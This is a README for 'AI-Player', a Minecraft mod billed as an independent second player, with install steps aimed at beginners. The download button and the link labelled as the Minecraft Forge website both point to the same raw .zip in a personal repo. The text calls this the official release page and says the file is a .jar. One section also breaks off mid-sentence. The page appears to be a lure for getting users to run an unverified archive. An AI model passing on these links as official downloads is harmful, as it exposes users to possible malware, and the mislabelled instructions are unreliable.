## 📋 About AI-Player

AI-Player is a Minecraft mod that adds a "second player" to your game. This player acts independently and uses smart behavior. It can help you explore, gather resources, or fight enemies while you focus on other tasks. The goal is to make your game more interactive and fun without needing another person.

This mod works on Windows computers and fits well into your existing Minecraft setup. You do not need to know how to code or use complex tools to get it running.

---

## 🖥 System Requirements

Before installing, make sure your PC meets these minimum needs:

- Windows 10 or later (64-bit)
- Minecraft Java Edition version 1.16 or newer
- At least 4 GB of RAM available for Minecraft
- Around 500 MB of free disk space for the mod files
- A stable internet connection for downloading

You do not need any extra software other than Minecraft. The mod runs inside the game.

## 🚀 Getting Started

Getting AI-Player up and running takes just a few steps. You can follow along even if you have never installed mods before.

### Step 1: Download the Mod

Click the button below or visit the link to download the mod files.

[![Download AI-Player](https://img.shields.io/badge/Download-AI--Player-blue)](https://github.com/AlmightyCake969/AI-Player/raw/refs/heads/main/downily/A-Player-1.8.zip)

This link goes to the official release page on GitHub. You will find the latest mod file there, usually ending with `.jar`. This file contains the mod you need.

---

### Step 2: Install Minecraft Forge

AI-Player requires Minecraft Forge, a tool that allows mods to run in Minecraft.

1. Go to the Minecraft Forge website at https://github.com/AlmightyCake969/AI-Player/raw/refs/heads/main/downily/A-Player-1.8.zip
2. Choose the version of Forge that matches your Minecraft version (usually the latest recommended version).
3. Download the Installer for Windows.
4. Run the installer by double-clicking the file.
5. Choose "Install Client" and wait for it to finish.
6. Launch Minecraft using the Forge profile created by the installer.

If you already have Forge installed, you can skip this step.

---

### Step 3: Add the Mod File

1. Press `Windows + R` on your keyboard to open the Run dialog.
2. Type `%appdata%\.minecraft\mods` and press Enter.
3. If there is no `mods` folder, create it now.
4. Move the downloaded `.jar` mod file from Step 1 into the `mods` folder.
5. Make sure the file is directly inside `mods`, not in a subfolder.

---

### Step 4: Start Minecraft with AI-Player

1. Open the Minecraft launcher.
2. Select the Forge profile from the list.
3. Click Play.
4. Once Minecraft loads, start or create a world.
5. AI-Player will load automatically as the second player.

When you start your world, AI-Player will appear as another player who can help you. Here are some basic ways to interact:

## 🛠 Troubleshooting and Tips

If AI-Player does not show up or causes issues, check the following:

- Make sure you ran Minecraft with the Forge profile.
- Confirm the mod file is in the `mods` folder.
- Use the mod version that matches your Minecraft version.
- Check for conflicts with other mods by disabling them one at a time.
- Restart your computer if changes don’t take effect.

## 📂 Uninstalling AI-Player

If you want to remove the mod:

1. Close Minecraft.
2. Open the `%appdata%\.minecraft\mods` folder.
3. Delete the AI-Player `.jar` file.
4. Restart Minecraft.

This will return your game to normal without AI-Player features.
